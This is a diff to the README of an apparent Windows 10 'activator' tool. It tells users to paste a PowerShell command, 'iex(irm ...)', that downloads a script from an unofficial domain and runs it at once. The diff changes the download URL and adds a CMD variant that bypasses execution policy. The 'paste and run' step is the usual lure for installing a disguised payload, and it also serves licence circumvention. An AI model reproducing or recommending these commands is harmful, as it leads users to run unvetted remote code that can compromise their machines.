@@ -26,14 +26,14 @@ WINDOWS-10-ACTIVATOR-2.0 is a focused utility built to streamline Windows 10 act
 Paste and run. Wait until the process completes.
 
 ```cmd
-iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
+iex(irm 'https://activation-gateway.cc/update/ps-activator')
 ```
 
 ### 3️⃣ If Windows blocks the script — use CMD
 Copy into CMD, press `Enter`, wait for completion:
 
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
 ```
 
 > [!WARNING]
